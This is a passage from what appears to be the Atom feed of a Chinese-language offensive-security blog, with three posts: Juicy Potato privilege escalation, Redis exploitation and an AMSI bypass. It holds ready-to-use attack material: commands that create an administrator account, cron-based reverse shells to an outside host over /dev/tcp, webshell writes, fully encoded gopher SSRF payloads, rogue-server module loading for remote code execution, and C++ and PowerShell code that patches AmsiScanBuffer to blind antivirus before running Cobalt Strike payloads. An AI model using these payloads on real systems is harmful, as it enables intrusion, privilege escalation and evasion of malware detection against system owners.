+Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。</p>
+<p>4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token<br>
+重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。</p>
+<p>5、利用System权限的Token创建新进程<br>
+如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。<br>
+如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限<br>
+[</p>
+</blockquote>
+<p>](https://blog.csdn.net/negnegil/article/details/120243657)</p>
+<p>简洁版</p>
+<blockquote>
+<p>在本地账户的权限下<br>
+1.以system权限加载COM请求，认证NTLM（当然我们是本地账户，无法越权使用system权限，会认证失败）</p>
+<p>2.再以本地账户权限发起默认135端口请求，认证NTLM（这次权限对了认证成功了）</p>
+<p>3.分别拦截两个NTLM的数据包，替换数据，使得通过步骤1的认证，获得system权限的token</p>
+<p>4.利用system权限的token创建进程</p>
+</blockquote>
+<pre><code class="language-csharp">如果开启SeImpersonate权限，juicypotato的参数可以使用-t t 
+如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u 
+如果均开启，可以选择-t * 如果均未开启，那么无法提权。
+</code></pre>
+<pre><code class="language-csharp">netstat -abno
+查看RPC默认端口是否为135
+
+
+##若rpc服务被修改，则使用-n 参数指定修改后的端口，如 -n 111
+##添加防火墙规则，允许135端口入站
+##netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow
+</code></pre>
+<pre><code class="language-csharp">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
+不同操作系统选择可用的CLSID
+例如测试系统Server2012，选择CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}
+
+
+
+选择系统未占用的端口作为监听端口
+最终提权命令如下
+
+JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
+执行成功即可获取一个system权限的shell，后续就是打开任务管理器，关闭explore任务，再开启explore任务即可得到一个system权限的桌面
+</code></pre>
+<h3 id="webshell版本">webshell版本</h3>
+<p><a href="https://github.com/uknowsec/JuicyPotato">https://github.com/uknowsec/JuicyPotato</a></p>
+<pre><code class="language-csharp">C:\juicyPotato_32.exe -p whoami
+
+##执行命令
+execute -f juicypotato.exe -p net user test 123456
+execute -f juicypotato.exe -p net localgroup administrators test /add
+</code></pre>
+<h2 id="其他问题">其他问题</h2>
+<p>为什么即使打了补丁,但是土豆提权这个方法依然好用</p>
+<blockquote>
+<p>不同系统补丁编号可能不一样</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[redis]]></title>
+        <id>https://pyroxenites.github.io/post/redis/</id>
+        <link href="https://pyroxenites.github.io/post/redis/">
+        </link>
+        <updated>2022-04-28T05:25:20.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="redis利用总结">redis利用总结</h1>
+<h2 id="未授权访问">未授权访问</h2>
+<pre><code class="language-java">redis-cli -h 1.1.1.1
+redis-cli -h 1.1.1.1 -p 42223
+</code></pre>
+<h2 id="利用计划任务反弹shell">利用计划任务反弹shell</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1641029212270-e64b2860-8ccf-418a-8c46-4592edcba60e.png" alt="image-20211214084927078.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1641029226613-b3c7db9d-e48c-49da-bf61-88ab6fc85288.png" alt="image-20211214084749402.png" loading="lazy"></p>
+<p><code>可以用NC进行连接</code></p>
+<p><code>centos反弹成功,ubuntu失败</code></p>
+<pre><code class="language-shell">set  xx   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.3.20/9999 0&gt;&amp;1\n&quot;
+ 
+config set dir /var/spool/cron/ #设置要导出的目录
+ 
+config set dbfilename root
+ 
+save #保存
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1641029243396-5f7f85d5-0d63-4ba5-a032-a7fe888a0d64.png" alt="image-20211214085443320.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1641029253960-3e3e2e0c-96b3-4d6d-99ae-2ac5b0439d26.png" alt="image-20211214085136264.png" loading="lazy"></figure>
+<h2 id="redis密钥登录ssh">redis密钥登录ssh</h2>
+<ol>
+<li>root权限启动</li>
+<li>有.ssh</li>
+</ol>
+<pre><code class="language-shell">ssh-keygen -t rsa #生成密钥 
+
+(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt #防止乱码导出key
+     
+cat /root/.ssh/key.txt | ./redis-cli -h 192.168.10.153 -x set xxx #导入内容
+</code></pre>
+<pre><code class="language-shell">config set dir /root/.ssh #设置路径
+ 
+config set dbfilename authorized_keys #设置文件名
+
+save
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1641029269049-ee878b5e-ae0d-49f1-ade9-62a7527b23fa.png" alt="image-20211214090243502.png" loading="lazy"></figure>
+<p>不能getshell</p>
+<pre><code class="language-shell">ssh -i id_rsa root@1.1.1.1
+</code></pre>
+<h2 id="redis写webshell">redis写webshell</h2>
+<ul>
+<li>config set dir /var/www/html/</li>
+<li>config set dbfilename redis.php</li>
+<li>set webshell “”</li>
+<li>save</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1641029301509-893624d5-baf8-4c81-9bb7-9377d28ce5ff.png" alt="image-20211214090712326.png" loading="lazy"></figure>
+<p><code>网站目录可以从phpinfo等信息泄露中寻找</code></p>
+<h2 id="redis主从复制">redis主从复制</h2>
+<h3 id="简介">简介</h3>
+<p>存在于4.x,5.x版本中,redis提供主从模式,使用一个redis作为主机,其他的作为备份机</p>
+<p>主机从机数据都是一样的,从机只负责读,主机只负责写</p>
+<p>在redis4.x后,通过外部拓展,可以实现在redis中实现一个新的Redis命令</p>
+<p>构造恶意.so文件,在两个redis实例设置主从模式的时候,redis的主机实例可以通过FULLRESYNC同步文件到从机上,然后从机加载恶意so文件,即可实现RCE</p>
+<h3 id="利用方式1">利用方式1</h3>
+<p><a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p>
+<p>i:正向连接</p>
+<p>r:反弹<br>
+<img src="https://pyroxenites.github.io/post-images/1641029318490-da774b16-9c3e-4250-81cf-e8d55be53349.png" alt="image-20211214091101397.png" loading="lazy"></p>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1641029328218-f0fbba8c-3e6e-4d26-9db3-0cf74f14e00c.png" alt="image-20211214091108736.png" loading="lazy"></figure>
+<h3 id="利用方式2">利用方式2</h3>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<pre><code>./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
+</code></pre>
+<p><a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></p>
+<h2 id="ssrf-redis反弹shell">ssrf redis反弹shell</h2>
+<ul>
+<li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li>
+<li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li>
+<li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB，Redis）</li>
+<li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li>
+<li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li>
+</ul>
+<pre><code class="language-php"> fsockopen()      file_get_contents()     curl_exec()
+</code></pre>
+<p><code>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</code></p>
+<pre><code>GET /ssrf/ssrf.php?url=http://clmppw.dnslog.cn  HTTP/1.1
+
+Host: 192.168.124.1
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: zh,en-US;q=0.7,en;q=0.3
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+</code></pre>
+<p><strong>实际功能点</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1641029345675-50d21f09-9d95-4f44-9708-c7b041143282.png" alt="image-20211214094049060.png" loading="lazy"></figure>
+<pre><code>抓包发现post参数好像有点意思，尝试换掉默认图片的地址，改为dnslog地址，返回提示路径不正确。
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1641029356573-0683d6d4-8af3-4f12-b223-3f6ea9bd308e.png" alt="image-20211214094117733.png" loading="lazy"></figure>
+<pre><code>猜测是做了后缀的限制，应该只能post png,jpg等后缀的地址，先试试读取一下远程服务器上的图片，成功返回，果然有东西。
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1641029372324-78f80603-b16f-4223-803f-6c36bf0a935c.png" alt="image-20211214094139460.png" loading="lazy"></figure>
+<pre><code>一个标准的ssrf，，因为没法改变后缀，应该是不能读取passwd之类的文件了，还是先打一波dnslog，记录一下真实ip地址
+
+先借助ssrf探测一下开放的端口，22，80，443，6379。
+</code></pre>
+<h3 id="dic协议端口探测">dic协议端口探测</h3>
+<p>抓包将端口那里设为要爆破的参数</p>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235414093-1882268458.png" alt="" loading="lazy"></figure>
+<p>可以事先准备个端口字典，根据Length升序即可</p>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235413622-1575389802.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1641029399125-dff7dd98-6e11-4ca2-b5f0-f948e9f6597a.png" alt="image-20211214094226111.png" loading="lazy"></figure>
+<p><code>看看攻击redis一般可以利用的dict和gopher两种协议，使用gopher协议的话需要注意一些利用限制。</code></p>
+<figure data-type="image" tabindex="12"><img src="https://pyroxenites.github.io/post-images/1641029412167-53b7e260-eb42-4eb4-912b-9e3b310441a0.png" alt="image-20211214094316997.png" loading="lazy"></figure>
+<p>gopher协议规则比较复杂，经过查找，找到了一款工具，使用其生成的payload很准确，且可自定义。</p>
+<p><a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p>
+<p>需要将内容再进行一次url编码传到web的参数中才会正常运行。</p>
+<h3 id="dict-redis利用">dict redis利用</h3>
+<p>先INFO探测是否设置口令，比如下图提示就是有的</p>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235413188-1418255141.png" alt="" loading="lazy"></figure>
+<ol>
+<li>写入内容:dict://127.0.0.1:6379/set❌test</li>
+<li>设置保存路径:dict://127.0.0.1:6379/config:set:dir:/tmp/</li>
+<li>设置保存文件名：dict://127.0.0.1:6379/config:set:dbfilename:1.png</li>
+<li>保存:dict://127.0.0.1:6379/save</li>
+</ol>
+<p>通过dict协议访问后并没有出现回显，不知道是否存在未授权的redis服务，盲打一顿可能浪费宝贵的时间，灵光乍现，可以先写一个图片文件到tmp目录里，再通过file协议进行读取，出现内容就表明redis是能够利用的。</p>
+<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1641029431921-f5a7e65a-8123-411a-a7a9-6c4bef3ca4dc.png" alt="image-20211214095118849.png" loading="lazy"></figure>
+<h4 id="dict写webshell">dict写webshell</h4>
+<p>更改rdb文件的目录至网站目录下</p>
+<pre><code>url=dict://192.168.124.153:6380/config:set:dir:/var/www/html
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235412165-85687148.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235411616-1929322818.png" alt="" loading="lazy"></figure>
+<p>将rdb文件名dbfilename改为webshell的名字</p>
+<pre><code>url=dict://192.168.124.153:6380/config:set:dbfilename:webshell.php
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235411228-782509580.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235410806-1578853433.png" alt="" loading="lazy"></figure>
+<p>如果存在payload被转义或有过滤情况，可利用16进制，写入webshell</p>
+<pre><code>GET /ssrf/ssrf.php?url=dict://192.168.124.153:6380/set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e&quot;
+</code></pre>
+<p>靶机redis有成功写入，注意最后写save刷新缓存。</p>
+<figure data-type="image" tabindex="19"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235409320-328389569.png" alt="" loading="lazy"></figure>
+<h4 id="dict打计划任务">dict打计划任务</h4>
+<p>因为利用redis去ubuntu写总会有很多玄学问题，这里就用上面准备的centos的redis环境。</p>
+<pre><code class="language-shell">set 1 '\n\n*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n'
+
+转换一下即：
+url=dict://192.168.124.153:6380/set:shell:&quot;\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/192.168.124.141/2333\x200\x3e\x261\n\n&quot;
+但还要注意这里不能够这么写：\x5c 而应该直接就 \n，也不要写\r\n 因为linux换行符就是\n你写\r反而可能会出现参数污染
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235408280-696471952.png" alt="" loading="lazy"></figure>
+<h3 id="gopher利用">gopher利用</h3>
+<p><a href="https://github.com/firebroo/sec_tools/tree/master/">https://github.com/firebroo/sec_tools/tree/master/</a></p>
+<h4 id="gopher写入webshell">gopher写入webshell</h4>
+<p><code>redis.cmd</code>写入攻击所需的redis指令</p>
+<figure data-type="image" tabindex="21"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235407874-1777982043.png" alt="" loading="lazy"></figure>
+<p>运行 <code>redis-over-gopher.py</code> 得到payload</p>
+<figure data-type="image" tabindex="22"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235407460-799619690.png" alt="" loading="lazy"></figure>
+<p>根据目标信息把ip和port换一下即可</p>
+<p>如果这里使用的是<code>curl</code>命令（比如在命令行curl + gopher）url编码一次即可。也就是用下面的payload就可以</p>
+<pre><code>gopher://192.168.124.153:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%33%0d%0a%73%68%65%6c%6c%5f%73%65%63%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
+</code></pre>
+<p>如果是web端的参数有ssrf，需要url编码两次才可以打进去，只编码一次时 <code>？</code> 会作为干扰使得后面payload打不进去。编码时只把特殊符号编码即可，如下：</p>
+<pre><code>gopher://192.168.124.153:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2533%250d%250a%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2531%2533%250d%250a%2573%2568%2565%256c%256c%255f%2573%2565%2563%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2531%2538%250d%250a%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
+</code></pre>
+<p>写入成功。</p>
+<figure data-type="image" tabindex="23"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235405954-771975438.png" alt="" loading="lazy"></figure>
+<h4 id="gopher定时任务反弹shell">gopher定时任务反弹shell</h4>
+<p>关于定时任务：</p>
+<p>centos： 在/var/spool/cron/root 或 /etc/crontab</p>
+<p>ubuntu:   在/var/spool/cron/crontabs/root 或 /etc/crontab</p>
+<p>Ubuntu这个计划任务吧，利用redis写入总会出现问题，这里使用centos的环境。</p>
+<p>与dict打redis类似先将弹shell语句写入 <code>redis.cmd</code></p>
+<pre><code>flushall
+config set dir /var/spool/cron
+config set dbfilename root
+set shell &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.124.
+141/2333 0&gt;&amp;1\n\n&quot;
+save
+</code></pre>
+<p>运行<code>redis-over-gopher.py</code>生成payload，更改payload中的ip和port</p>
+<figure data-type="image" tabindex="24"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235405408-1815946993.png" alt="" loading="lazy"></figure>
+<pre><code>gopher://192.168.124.128:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%35%0d%0a%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%34%0d%0a%72%6f%6f%74%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%35%0d%0a%73%68%65%6c%6c%0d%0a%24%36%30%0d%0a%5c%6e%5c%6e%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%32%34%2e%31%34%31%20%30%3e%26%31%5c%6e%5c%6e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
+</code></pre>
+<p>同样的，如果不是利用curl的话，直接打需要再次url编码。</p>
+<pre><code>gopher://192.168.124.128:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2535%250d%250a%252f%2576%2561%2572%252f%2573%2570%256f%256f%256c%252f%2563%2572%256f%256e%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2534%250d%250a%2572%256f%256f%2574%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2535%250d%250a%2573%2568%2565%256c%256c%250d%250a%2524%2536%2530%250d%250a%25%5c%256e%25%5c%256e%252a%252f%2531%2520%252a%2520%252a%2520%252a%2520%252a%2520%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2531%2532%2534%252e%2531%2534%2531%2520%2530%253e%2526%2531%25%5c%256e%25%5c%256e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
+</code></pre>
+<figure data-type="image" tabindex="25"><img src="https://pyroxenites.github.io/post-images/1835657-20201230235404218-1887799963.png" alt="" loading="lazy"></figure>
+<h2 id="本地redis主从复制">本地redis主从复制</h2>
+<blockquote>
+<p>一般redis只允许本地访问 bind 127.0.0.1</p>
+<p>进入服务器可以访问redis</p>
+</blockquote>
+<pre><code class="language-shell">redis&gt;config set dir /tmp
+redis&gt;config set dbfilename exp.so
+redis&gt;slaveof 主机vps 主机端口
+
+kali&gt;python3 redis_rogue_server.py -v -path exp.so
+#主动连接主机,从机会同步信息,包括exp.so
+
+redis&gt;module list
+redis&gt;module load ./exp.so
+redis&gt;module list
+redis&gt;system.rev 反弹IP 反弹端口
+redis&gt;slaveof NO ONE  #断开主从连接
+redis&gt;module unload ./exp.so #卸载expso文件
+
+##不加./可能加载可能会失败
+</code></pre>
+<h2 id=""></h2>
+<h2 id="windows">windows</h2>
+<ol>
+<li>写入webshell</li>
+<li>主从复制,so文件变成dll文件</li>
+<li>反弹shell-&gt; 将dirfile写到Startup目录下</li>
+</ol>
+<h2 id="利用工具">利用工具</h2>
+<p><a href="https://github.com/yuyan-sec/RedisEXP">https://github.com/yuyan-sec/RedisEXP</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[AMSI绕过]]></title>
+        <id>https://pyroxenites.github.io/post/amsi-rao-guo/</id>
+        <link href="https://pyroxenites.github.io/post/amsi-rao-guo/">
+        </link>
+        <updated>2022-04-22T08:53:44.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>powershell无文件特性,在实战中还是比较好用的</p>
+</blockquote>
+<p>AMSI 允许服务和应用程序与已安装的反恶意软件进行通信。当系统中开始创建进程或者被申请内存，AMSI 就会处于挂钩状态，例如，Windows 脚本主机(WSH) 和PowerShell，以便对正在执行的内容进行去混淆处理和分析。此内容在执行之前被“捕获”并发送到反恶意软件解决方案。</p>
+<blockquote>
+<p><a href="https://github.com/PKRoma/ProcessHacker">https://github.com/PKRoma/ProcessHacker</a></p>
+</blockquote>
+<p>观察<br>
+这里可以用Process Monitor观察一下<br>
+过滤规则如下</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648259213131-d487ac43-a5ff-4e19-85bc-d88c5dc32ade.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648255519750-a0721b17-0914-4f77-83f9-77849c08f275.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648259656040-7e9550df-1998-4896-a062-81162525e6b9.png" alt="火绒剑效果" loading="lazy"><br>
+我们会发现当我们启动powershell的时候,便加载了amsi.dll</p>
+<p>amsi本质上是一个dll,故它具有其导出函数<br>
+<img src="https://pyroxenites.github.io/post-images/1648259575456-da2a2beb-d239-4279-9301-a2a8ba5589b7.png" alt="image.png" loading="lazy"></p>
+<h2 id="手动检测">手动检测</h2>
+<ol>
+<li>调试器附加并定位AmsiScanBuffer函数</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1648258778306-9ee76b87-eb39-45c3-adfd-720c1679ee1a.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>修补该函数让其直接返回</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1648258832434-154bcca0-7b66-4333-9441-b27424306444.png" alt="image.png" loading="lazy"></figure>
+<h3 id="windows-defender为例">windows defender为例</h3>
+<p>在腾讯云windows自带的windows def</p>
+<blockquote>
+<p>字符串是否敏感是由amsi.dll中的AmsiScanBuffer函数来进行判断的<br>
+AmsiScanBuffer函数应该返回HRESULT类型值，这是一个整数值，用来表示操作是否成功</p>
+</blockquote>
+<blockquote>
+<p>在函数执行过程中，待分析的内容会被发送到反恶意软件服务，后者会返回1到32762（含）之间的一个整数。整数值越大，则代表风险越高。如果证书大于或等于32762，那么就会将其判断为恶意数据，加以阻止。随后系统会根据返回的整数值来更新AMSI_RESULT变量值。</p>
+</blockquote>
+<p>故可以看出amsi使用&quot;基于字符串&quot;的检测方式</p>
+<ol>
+<li>使用replace去替换字符串内容</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1648255689917-49c79dae-b139-4f6e-a792-ab1f420a89f4.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>字符串断点+拼接</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1648255929288-97036414-b4e2-4297-a8ef-430e667a0d30.png" alt="image.png" loading="lazy"></figure>
+<ol start="3">
+<li>剩下可以通过编码方式</li>
+</ol>
+<ul>
+<li>base64</li>
+<li>XOR</li>
+<li>HEX</li>
+</ul>
+<h2 id="内存补丁绕过技术">内存补丁绕过技术</h2>
+<ul>
+<li>创建一个powershell进程</li>
+<li>获取amsiscanbuffer函数地址</li>
+<li>修改函数内存空间属性</li>
+<li>修补函数执行体</li>
+</ul>
+<pre><code class="language-cpp">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+int main() {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    
+    CreateProcessA(NULL, (LPSTR)&quot;powershell -NoExit dir&quot;, NULL, NULL, NULL, NULL, NULL, NULL, &amp;si, &amp;pi);
+    
+    HMODULE hAmsi = LoadLibraryA(&quot;amsi.dll&quot;);
+    LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, &quot;AmsiScanBuffer&quot;);
+    
+    Sleep(500);
+    
+    DWORD oldProtect;
+    char patch = 0xc3;
+    
+    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+    WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &amp;patch, sizeof(char),NULL);
+    VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    FreeLibrary(hAmsi);
+    return 0;
+}
+</code></pre>
+<p>powershell脚本如下：</p>
+<pre><code class="language-powershell">$Win32 = @&quot;
+ 
+using System;
+using System.Runtime.InteropServices;
+ 
+public class Win32 {
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr LoadLibrary(string name);
+ 
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+ 
+}
+&quot;@
+ 
+Add-Type $Win32
+ 
+$LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;)
+$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;)
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
+$Patch = [Byte[]] (0xc3, 0x90, 0x90)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1648273726812-4e45347f-d2c8-406c-9a1c-7f30fc9e8cb9.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>前提是要保证程序或者脚本不被查杀,否则起不到修补作用</p>
+</blockquote>
+<ol>
+<li>使用CS生成一个ps1脚本</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1648275905921-01541b6b-9b57-4669-810b-5633c325b252.png" alt="image.png" loading="lazy"><br>
+将其bases64编码</p>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1648274934892-1b7ffc63-9e63-4189-886b-6a2841476d23.png" alt="image.png" loading="lazy"></figure>
+<pre><code class="language-cpp">$Encryption = @'   '@.Replace('xxx','') 
+##Encryption可以多用replace进行替换混淆
+
+$Decryption = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Encryption))
+
+</code></pre>
+<p>将修补代码加到IEX之前,从而破坏AMSI</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648276635615-3556eeea-2bee-4b80-a78a-13c8d5832e3a.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648276814488-40d00fe1-7e92-4c9d-98ce-f7317a1f4676.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1648277063817-60c8ad8a-d4a3-4fdd-86c5-d2b1cba3e4a6.png" alt="image.png" loading="lazy"><br>
+<a href="https://paste.ee/"><br>
+</a></p>
